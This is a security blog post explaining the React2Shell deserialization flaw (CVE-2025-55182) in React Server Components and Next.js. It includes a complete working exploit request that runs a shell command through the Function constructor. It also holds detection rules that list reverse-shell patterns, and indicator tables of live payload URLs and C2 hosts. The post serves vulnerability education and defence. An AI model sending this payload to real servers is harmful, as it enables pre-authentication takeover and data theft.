---
title: How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown
date: 2026-01-09
draft: false
tags:
  - CVE-2025-55182
  - React2Shell
  - TryHackMe
  - RCE
  - Insecure_Deserialization
categories:
  - CVE
summary: This blog breaks down how the React2Shell vulnerability (CVE-2025-55182) abuses insecure deserialization in React Server Components’ Flight protocol to achieve pre-authentication remote code execution, and provides detection, mitigation, and threat-hunting guidance for defenders.
---
## **Introduction**

In this article, we take a detailed look at **CVE-2025-55182**, a critical vulnerability revealed in December 2025 that immediately drew attention across the security community. Classified with the maximum **CVSS score of 10.0**, this flaw represents a complete breakdown of trust boundaries within applications built using **React Server Components (RSC)**.

Frameworks that rely heavily on RSC—most notably **Next.js**—are directly exposed to this issue. The vulnerability was informally named **“React2Shell”** by the researchers who uncovered it, highlighting the severity of the attack path. With minimal interaction and no authentication required, a remote attacker can trigger arbitrary code execution on the server by sending a single malicious HTTP request.

This exploit essentially turns a feature intended for high-performance server-side rendering into a direct entry point for full system compromise, making it one of the most dangerous web vulnerabilities discovered in recent years.

---

## **React Server Components and the React Flight Protocol**

To fully understand how the React2Shell vulnerability works, it’s important to grasp the fundamentals of **React Server Components (RSC)** and the **React Flight** communication protocol. RSC, introduced in **React 19**, shifts part of the rendering workload from the browser to the server. Instead of sending raw JavaScript to the client, the server performs the heavy computation and returns a pre-processed component tree. This design improves performance, reduces bundle sizes, and allows the client to stay lightweight.

To support this architecture, React relies on a low-level data exchange format known as the **Flight Protocol**. The Flight Protocol defines how the server serialises component output and how the client deserialises it back into a usable structure. When the browser needs the server to run a “Server Action”—a function that executes only on the server—it sends a specially encoded payload. This payload contains references and type markers that React uses to reconstruct component data.

React Flight uses unique markers in its serialisation format, such as:

- **`$@`** → chunk reference
- **`$B`** → Blob reference
- **`$1:constructor:constructor`** → property path references using colon-separated accessors

These markers allow React to efficiently reference modules, functions, and objects without shipping entire definitions over the network. However, this is also where the core of the vulnerability emerges.

### ***Where the Vulnerability Appears***

The vulnerable versions of React Server Components **fail to properly validate** these incoming references. The server assumes that the client will only send legitimate references to exported modules. Instead, an attacker can craft a malicious payload containing forged serialisation markers that point to internal JavaScript properties or object constructors that should never be exposed.

Because the server blindly trusts these references:

- Arbitrary object paths can be accessed
- Prototype chains can be polluted
- Malicious data structures can be instantiated
- Server-side execution can be redirected to attacker-controlled values

This behaviour allows hostile clients to forge a payload that React treats as valid—ultimately enabling prototype pollution and, in affected frameworks such as **Next.js**, full remote code execution.

### ***Why This Vulnerability Is So Dangerous***

Several factors contribute to the severity of React2Shell (CVE-2025-55182):

- **Vulnerable by default** — no misconfiguration or custom code is required
- **Single-request exploitation** — only one HTTP request is needed
- **Pre-authentication attack** — the attacker doesn’t need to log in
- **Highly reliable PoCs** — exploit scripts work consistently
- **Affects the entire RSC ecosystem** — including popular frameworks like Next.js

Because React Server Components sit at the core of server-side rendering in modern React apps, compromising them effectively gives an attacker direct access to backend execution paths.

---

## **Insecure Deserialization and How It Affects React Server Components**

At the heart of the React2Shell vulnerability lies a classic security flaw: **Insecure Deserialization**. In typical server-side applications, deserialization occurs when structured data—JSON, binary formats, or custom protocols—is converted back into in-memory objects. If this process does not include strict validation, attackers can craft malicious payloads that the system interprets as trusted data, potentially leading to code execution, data manipulation, or full system compromise.

React Server Components (RSC) introduce a unique form of deserialization through the **Flight Protocol**, which interprets special markers and data structures to reconstruct server-side resources requested by the client. This makes RSC heavily reliant on safe deserialization practices. Unfortunately, CVE-2025-55182 exposes how fragile this mechanism can be when not validated properly.

### ***How Deserialization Works in RSC***

CVE-2025-55182 is fundamentally an **Insecure deserialization vulnerability** in how React Server Components handle incoming Flight protocol payloads. The vulnerability exists in the `requireModule` function within the `react-server-dom-webpack` package. Let’s examine the problematic code pattern:

```jsx
function requireModule(metadata) {
 var moduleExports = __webpack_require__(metadata[0]);
 // ... additional logic ...
 return moduleExports[metadata[2]];  // VULNERABLE LINE
}
```

The critical flaw is in the bracket notation access `moduleExports[metadata[2]]`. In JavaScript, when we access a property using bracket notation, the engine doesn’t just check the object’s own properties—it traverses the entire prototype chain. This means an attacker can reference properties that weren’t explicitly exported by the module.

Most importantly, every JavaScript function has a `constructor` property that points to the `Function` constructor. By accessing `someFunction.constructor`, an attacker obtains a reference to the global `Function` constructor, which can execute arbitrary JavaScript code when invoked with a string argument.

The vulnerability becomes exploitable because React’s Flight protocol allows clients to specify these property paths through the colon-separated reference syntax. An attacker can craft a reference like `$1:constructor:constructor` which traverses:

1. Get chunk/module 1
2. Access its `.constructor` property (gets the Function constructor)
3. Access `.constructor` again (still the Function constructor, but confirms the chain).

---

## **Affected Versions & Components**

The vulnerability is present in versions 19.0, 19.1.0, 19.1.1, and 19.2.0 of:

- [react-server-dom-webpack](https://www.npmjs.com/package/react-server-dom-webpack)
- [react-server-dom-parcel](https://www.npmjs.com/package/react-server-dom-parcel)
- [react-server-dom-turbopack](https://www.npmjs.com/package/react-server-dom-turbopack?activeTab=readme)

Some React frameworks and bundlers depended on, had peer dependencies for, or included the vulnerable React packages. The following React frameworks & bundlers are affected: [next](https://www.npmjs.com/package/next), [react-router](https://www.npmjs.com/package/react-router), [waku](https://www.npmjs.com/package/waku), [@parcel/rsc](https://www.npmjs.com/package/@parcel/rsc), [@vitejs/plugin-rsc](https://www.npmjs.com/package/@vitejs/plugin-rsc), and [rwsdk](https://www.npmjs.com/package/rwsdk).

See the [update instructions](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components#update-instructions) for how to upgrade to these patches.

---

## **Attack Surface Mapping**

To exploit CVE-2025-55182, an attacker sends a crafted input to a web application running React Server Components functions in the form of a POST request. This input is then processed as a serialized object and passed to the backend server, where it is deserialized. Due to the default trust among the components, the attacker-provided input is then deserialized and the backend runs attacker-provided code under the NodeJS runtime.

![[Pasted image 20260109133545.png]]

Post-exploitation, attackers were observed to run arbitrary commands, such as reverse shells to known Cobalt Strike servers. To achieve persistence, attackers added new malicious users, utilized remote monitoring and management (RMM) tools such as MeshAgent, modified _authorized_keys_ file, and enabled root login. To evade security defenses, the attackers downloaded from attacker-controlled CloudFlare Tunnel endpoints (for example, *_.trycloudflare.com_) and used [bind mounts](https://attack.mitre.org/techniques/T1564/013/) to hide malicious processes and artifacts from system monitoring tools.

The malware payloads seen in campaigns investigated by Microsoft Defender vary from remote access trojans (RATs) like VShell and EtherRAT, the SNOWLIGHT memory-based malware downloader that enabled attackers to deploy more payloads to target environments, ShadowPAD, and XMRig cryptominers. The attacks proceeded by enumerating system details and environment variables to enable lateral movement and credential theft.

Credentials that were observed to be targeted included Azure Instance Metadata Service (IMDS) endpoints for Azure, Amazon Web Services (AWS), Google Cloud Platform (GCP), and Tencent Cloud to acquire identity tokens, which could be used to move laterally to other cloud resources. Attackers also deployed secret discovery tools such as TruffleHog and Gitleaks, along with custom scripts to extract several different secrets. Attempts to harvest AI and cloud-native credentials, such as OpenAI API keys, Databricks tokens, and Kubernetes service‑account credentials were also observed. Azure Command-Line Interface (CLI) (az) and Azure Developer CLI (azd) were also used to obtain tokens.

---

## **Proof of Concept (PoC) Breakdown**

Now let’s dissect how [maple3142’s proof-of-concept](https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http) achieves remote code execution. The exploit cleverly chains together multiple JavaScript engine behaviours to transform a deserialization bug into arbitrary code execution.

**Stage 1: Creating a Fake Chunk Object**

The exploit begins by sending a multipart form request with three fields. The first field contains a carefully crafted fake chunk object:

```json
{
 "then": "$1:__proto__:then",
 "status": "resolved_model",
 "reason": -1,
 "value": "{\\\\"then\\\\":\\\\"$B1337\\\\"}",
 "_response": {
   "_prefix": "process.mainModule.require('child_process').execSync('xcalc');",
   "_chunks": "$Q2",
   "_formData": {
     "get": "$1:constructor:constructor"
   }
 }
}

```

This object mimics React’s internal `Chunk` class structure. By setting `then` to reference `Chunk.prototype.then`, we’re creating a self-referential structure. When React processes this and awaits the chunk, it invokes the `then` method with the fake chunk as the context (`this`).

**Stage 2: Exploiting the Blob Deserialization Handler**

The second critical component is the `$B` handler reference (`$B1337`). In React’s Flight protocol, the `$B` prefix indicates a Blob reference. When React processes a Blob reference, it calls a function that internally uses `response._formData.get(response._prefix + id)`.

Here’s where the exploitation becomes elegant: we’ve polluted the `_response` object with our malicious properties. When the Blob handler executes:

```jsx
response._formData.get(response._prefix + id)
```

It actually executes:

```jsx
Function("process.mainModule.require('child_process').execSync('xcalc');1337")
```

Let’s break down why: we’ve set `_formData.get` to point to `$1:constructor:constructor`, which resolves to the `Function` constructor. The `_prefix` contains our malicious code. When these are combined, the `Function` constructor is invoked with our code as a string argument, creating and implicitly executing a function containing our arbitrary JavaScript.

**Stage 3: Achieving Code Execution**

The payload `process.mainModule.require('child_process').execSync('xcalc')` demonstrates the power of this exploit. We’re using Node.js’s module system to:

1. Access `process.mainModule` (the main module being executed)
2. Use its `require` method to load the `child_process` module
3. Call `execSync` to execute an operating system command
4. In this case, launching the calculator application (`xcalc`) as proof of exploitation

This could easily be modified to establish a reverse shell, exfiltrate environment variables containing secrets, read sensitive files, or perform any operation the Node.js process has permissions to execute.

Let’s examine the complete HTTP request from maple3142’s PoC:

```
POST / HTTP/1.1
Host: localhost
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\\\"then\\\\":\\\\"$B1337\\\\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('xcalc');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

The `Next-Action: x` header triggers React’s Server Action processing. The multipart body contains three parts:

- **Field 0**: The fake chunk object with our malicious `_response` structure
- **Field 1**: A reference `$@0` that points back to field 0, creating the self-reference
- **Field 2**: An empty array, completing the required structure

When the server processes this request, it deserialises field 0, encounters the $@0 reference in field 1, establishes the self-referential then property, and subsequently triggers the Blob handler, which executes our code through the `Function` constructor.

---

## **Detection & Monitoring**

This portion of the blog will provide various detection mechanisms for recognizing React2Shell within your network and environment.

Fortunately for us defenders, this specific vulnerability requires interacting within React & React Server Components (RCS) within a specific format and structure. Regular user browsing activity will not have specific headers and values within their HTTP(S) request that is required for exploiting this vulnerability.

For example, the Next-Action and multipart/form-data are an incredibly specific query and payload for the React Server Component Flight protocol. We will almost never see a regular/legitimate user providing this within their query, and the payload for the vulnerability must have certain elements:

- Next-Action `header`.
- `multipart/form-data`.
- Elements within form-data with elements such as `"status": "reserved_model"` within the payload.
- For reference, detecting the presence of `"then":"$1:__proto__:then"` within the payload is an extremely good indicator that React Server Components are being used. This should almost never be seen externally, but rather, within the application itself at a push.

Due to how exploitation of this vulnerability works, we can expect a certain pattern within the HTTP(S) request. Therefore, for monitoring and detection, rather than specifically inspecting the payload, we can rather monitor the format of the request.

### ***Snort (v3)***

To detect this vulnerability using Snort, we can use the following rule:

```bash
alert http any any -> $LAN_NETWORK any (
    msg:"Potential Next.js React2Shell / CVE-2025-66478 attempt";
    flow:to_server,established;
    content:"Next-Action"; http_header; nocase;
    content:"multipart/form-data"; http_header; nocase;
    pcre:"/Content-Disposition:\\s*form-data;\\s*name=\\"0\\"/s";
    pcre:"/\\"status\\"\\s*:\\s*\\"resolved_model\\"/s";
    pcre:"/\\"then\\"\\s*:\\s*\\"\\$1:__proto__:then\\"/s";
    classtype:web-application-attack
    sid:6655001;
    rev:1;
)
```

At a summary, this snort rule:

- Listens for specific headers within the request, that aren't usually generated by regular user traffic.
- Detects multipart/form-data where RSCs do not regularly use. Payloads for this vulnerability need to follow a certain specification for the exploit to be processed - we can detect this. For example, the `name="0"` element.

### ***OSQuery***

We can use the following OSQuery rule to detect vulnerable versions of React Server Components within an endpoint or anything within the CI/CD build process:

```json
{
  "queries": {
    "detect_rev2shell_react_server_components": {
      "query": "SELECT name, version, path FROM npm_packages WHERE (name='react-server-dom-parcel' AND (version='19.0.0' OR (version >= '19.1.0' AND version < '19.1.2') OR version='19.2.0')) OR (name='react-server-dom-turbopack' AND (version='19.0.0' OR (version >= '19.1.0' AND version < '19.1.2') OR version='19.2.0')) OR (name='react-server-dom-webpack' AND (version='19.0.0' OR (version >= '19.1.0' AND version < '19.1.2') OR version='19.2.0'));",
      "interval": 3600,
      "description": "Detects vulnerable versions of React Server Components packages (react-server-dom-*) affected by CVE-2025-55182 / CVE-2025-66478 / React2Shell.",
      "platform": "linux,windows,macos",
      "version": "1.0"
    }
  }
}
```

At a summary, this OSQuery rule:

- Detects if vulnerable packages are used within an endpoint: react-server-dom-parcel, react-server-dom-turbopack, react-server-dom-webpack.
- If present, checks the installed versions of these packages compared to vulnerable versions (I.e. 19.0.0, >= 19.1.0 / 19.2.0).

The benefit of this OSQuery rule is that we can search and determine for vulnerable versions across endpoints, rather hosted, or as part of the build or development process, before it even reaches production.

### ***Splunk***

This Splunk query identifies suspicious child processes spawned from Node.js or Next.js processes—such as server components or development servers—to detect possible React2Shell exploitation. It looks for high-risk binaries (curl, wget, bash, python, nc, socat, etc.) or shell-like behavior executed by Node-based processes, which would indicate an attacker has achieved remote code execution. The search correlates process activity, timestamps, parent/child relationships, and command patterns to highlight anomalous or malicious behavior originating from React Server Component workflows.

```bash
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime
  from datamodel=Endpoint.Processes
  where
    Processes.parent_process_name = "node"
    Processes.parent_process IN (
      "*--experimental-https*",
      "*--experimental-next-config-strip-types*",
      "*/node_modules/next*",
      "*next dev*",
      "*next start*",
      "*node_modules/.bin*",
      "*react-scripts start*",
      "*start-server.js*"
    )
    AND (
      Processes.process_name IN (
        "awk",
        "gawk",
        "ifconfig",
        "lua",
        "nc",
        "ncat",
        "netcat",
        "openssl",
        "perl",
        "php",
        "python",
        "python2",
        "python3",
        "ruby",
        "socat",
        "telnet"
      )
      OR (
        Processes.process_name IN ("curl", "wget")
        Processes.process = "*
|*"
      )
      OR (
        Processes.process_name IN (
          "bash",
          "dash",
          "sh"
        )
        NOT Processes.process = "*-c*"
      )
      OR (
        Processes.process_name IN (
          "bash",
          "dash",
          "ksh",
          "sh",
          "zsh"
        )
        Processes.process IN (
          "*/dev/tcp/*",
          "*/dev/udp/*",
          "*0>&1*",
          "*curl*",
          "*exec *>&*",
          "*fsockopen*",
          "*ifconfig*",
          "*mkfifo*",
          "*nc *",
          "*ncat*",
          "*netcat*",
          "*proc_open*",
          "*s_client*",
          "*socat*",
          "*socket*",
          "*subprocess*",
          "*TCPSocket*",
          "*wget*"
        )
      )
    )

by Processes.action Processes.dest Processes.original_file_name Processes.parent_process
   Processes.parent_process_exec Processes.parent_process_guid Processes.parent_process_id
   Processes.parent_process_name Processes.parent_process_path Processes.process
   Processes.process_exec Processes.process_guid Processes.process_hash Processes.process_id
   Processes.process_integrity_level Processes.process_name Processes.process_path
   Processes.user Processes.user_id Processes.vendor_product

| `drop_dm_object_name(Processes)`

| `security_content_ctime(firstTime)`

| `security_content_ctime(lastTime)`

| `linux_suspicious_react_or_next_js_child_process_filter`
```

### ***Kibana***

This rule detects exploitation attempts targeting CVE-2025-55182, a critical remote code execution vulnerability in React’s Flight protocol used by Next.js and other RSC implementations. The vulnerability stems from insecure prototype chain traversal in the Flight deserializer, allowing attackers to access `__proto__`, `constructor`, and ultimately the `Function` constructor to execute arbitrary code.

**Possible investigation steps**

- Examine the full HTTP request body to identify the specific attack payload and command being executed.
- Check the response body for `E{"digest":"..."}` patterns which contain command output from successful exploitation.
- Identify the target application and verify if it runs vulnerable React (< 19.1.0) or Next.js (< 15.3.2) versions.
- Review the source IP for other reconnaissance or exploitation attempts against web applications.
- Check for the `Next-Action` header which is required for the exploit to work.
- Correlate with process execution logs to identify if child processes (e.g., shell commands) were spawned by the Node.js process.

**False positive analysis**

- Legitimate React Server Components traffic will NOT contain `__proto__`, `constructor:constructor`, or code execution patterns.
- Security scanning tools like react2shell-scanner may trigger this rule during authorized penetration testing.
- The combination of prototype pollution patterns with RSC-specific syntax is highly indicative of malicious activity.

```bash
network where http.request.method == "POST" and
(
    // Successful CVE-2025-55182 RCE - command output in digest
    (
        http.response.status_code in (500, 303) and
        http.response.body.content like~ "*E{\\"digest\\"*" and
        http.request.body.content regex~ """.*\\$[0-9]+:[a-zA-Z_0-9]+:[a-zA-Z_0-9]+.*"""
    ) or
    // Prototype pollution attempts in RSC Flight data (never legitimate)
    (
        http.request.body.content regex~ """.*\\$[0-9]+:[a-zA-Z_0-9]+:[a-zA-Z_0-9]+.*""" and
        (
            http.request.body.content like~ "*__proto__*" or
            http.request.body.content like~ "*prototype*"
        )
    )
)
```

### ***Indicators of compromise***

The list below is non-exhaustive and does not represent all indicators of compromise observed in the known campaigns:

|Indicator|Type|Description|
|---|---|---|
|c6c7e7dd85c0578dd7cb24b012a665a9d5210cce8ff735635a45605c3af1f6adb568582240509227ff7e79b6dc73c933dcc3fae674e9244441066928b1ea056069f2789a539fc2867570f3bbb71102373a94c7153239599478af84b9c81f2a0368de36f14a7c9e9514533a347d7c6bc830369c7528e07af5c93e0bf7c1cd86df717c849a1331b63860cefa128a4aa5d476f300ac45fd5d3c56b2746f7e72a0d27909046e5e0fd60461b721c0ef7cfe5899f76672e4970d629bb51bb904a053987e0a0c48ee0f65c72a252335f6dcd435dbd448fc0414b295f635372e1c5a9171|SHA-256|Coin miner payload hashes|
|b33d468641a0d3c897e571426804c65daae3ed939eab4126c3aa3fa8531de5e8f0b66629fe8ad71779df5e4126c389e7702f975049bd17cb597ebcf03c6b110b59630d8f3b4db5acbcaccc0cfa54500f2bbb0745d4b5c50d903636f120fc870082335954bec84cbdd019cfa474f20f4274310a1477e03e34af7c62d15096fe0df0d3d5668a4df347eb0a59df167acddb245f022a518a6d15e37614af0bbc2adf317e10c4068b661d3721adaa35a30728739defddbc72b841c3d06aca0abd4d5e0aad73947fb1876923709213333099b8c728dde9f5d86acfd0f3702a963bae6a9dde35ba8e132ebed29e70f57da0c4f36a9401a7bbd36e6ddd257e0920aa4083240afa3a6457f1ee866f6f03ff815009ff8fd7b70b902bc59b037ac54b6cae9b8e07beb854f77e90c174829bd4e01e86779d596710ad161dbc0e02a219d6227f244bf271d2e55cd737980322de37c2c2792154b4cf4e4893e9908c2819026e5f|SHA-256|Backdoor payload hashes|
|hxxp://194[.]69[.]203[.]32:81/hiddenbink/colonna.archxxp://194[.]69[.]203[.]32:81/hiddenbink/colonna.i686hxxp://194[.]69[.]203[.]32:81/hiddenbink/react.shhxxp://162[.]215[.]170[.]26:3000/sex.shhxxp://216[.]158[.]232[.]43:12000/sex.shhxxp://196[.]251[.]100[.]191/no_killer/Exodus.arm4hxxp://196[.]251[.]100[.]191/no_killer/Exodus.x86hxxp://196[.]251[.]100[.]191/no_killer/Exodus.x86_64hxxp://196[.]251[.]100[.]191/update.shhxxp://anywherehost[.]site/xms/k1.shhxxp://anywherehost[.]site/xms/kill2.shhxxps://overcome-pmc-conferencing-books[.]trycloudflare[.]com/p.pnghxxp://donaldjtrmp.anondns.net:1488/labubuhxxp://labubu[.]anondns[.]net:1488/donghxxp://krebsec[.]anondns[.]net:2316/donghxxps://hybird-accesskey-staging-saas[.]s3[.]dualstack[.]ap-northeast-1[.]amazonaws[.]com/agenthxxps://ghostbin[.]axel[.]org/paste/evwgo/rawhxxp://xpertclient[.]net:3000/sex.shhxxp://superminecraft[.]net[.]br:3000/sex.sh|URLs|Various payload download URLs|
|194.69.203[.]32162.215.170[.]26216.158.232[.]43196.251.100[.]19146.36.37[.]8592.246.87[.]48|IP addresses|C2|
|anywherehost[.]sitexpertclient[.]netvps-zap812595-1[.]zap-srv[.]comsuperminecraft[.]net[.]brovercome-pmc-conferencing-books[.]trycloudflare[.]comdonaldjtrmp[.]anondns[.]netlabubu[.]anondns[.]netkrebsec[.]anondns[.]nethybird-accesskey-staging-saas[.]s3[.]dualstack[.]ap-northeast-1[.]amazonaws[.]comghostbin[.]axel[.]org|Domains|C2|

---

## **Mitigation Strategies**

### ***Patch immediately***

- React and Next.js have released fixes for the impacted packages. Upgrade to one of the following patched versions (or later within the same release line):
    - React: 19.0.1, 19.1.2, 19.2.1
    - Next.js: 5.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7
- Because many frameworks and bundlers rely on these packages, make sure your framework-level updates also pull in the corrected dependencies.

### ***Prioritize exposed services***

- Patch all affected systems, starting with internet-facing workloads.
- Use Microsoft Defender Vulnerability Management (MDVM) to surface vulnerable package inventory and to track remediation progress across your estate.

### ***Monitor for exploit activity***

- Review MDVM dashboards and Defender alerts for indicators of attempted exploitation.
- Correlate endpoint, container, and cloud signals for higher confidence triage.
- Invoke incident response process to address any related suspicious activity stemming from this vulnerability.

### ***Add WAF protections where appropriate***

- Apply Azure Web Application Firewall (WAF) custom rules for Application Gateway and Application Gateway for Containers to help block exploit patterns while patching is in progress. Microsoft has [published rule guidance and JSON examples](https://techcommunity.microsoft.com/blog/azurenetworksecurityblog/protect-against-react-rsc-cve-2025-55182-with-azure-web-application-firewall-waf/4475291) in the Azure Network Security Blog, with ongoing updates as new attack permutations are identified.

---

## **References and further reading**

- [TryHackMe Lab](https://tryhackme.com/room/react2shellcve202555182)
- [Official React Advisory](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [Official React Advisory - Facebook](https://www.facebook.com/security/advisories/cve-2025-55182)
- [Defending against the CVE-2025-55182 (React2Shell) vulnerability in React Server Components -**MSRC**](https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/)
- [https://www.youtube.com/watch?v=jwzeJU_62IQ](https://www.youtube.com/watch?v=jwzeJU_62IQ)
- [https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http](https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http)
- [https://www.elastic.co/guide/en/security/current/react2shell-cve-2025-55182-exploitation-attempt.html](https://www.elastic.co/guide/en/security/current/react2shell-cve-2025-55182-exploitation-attempt.html)
- [https://research.splunk.com/endpoint/cda04e9c-1950-43ab-87d6-e333a3d7f107/](https://research.splunk.com/endpoint/cda04e9c-1950-43ab-87d6-e333a3d7f107/)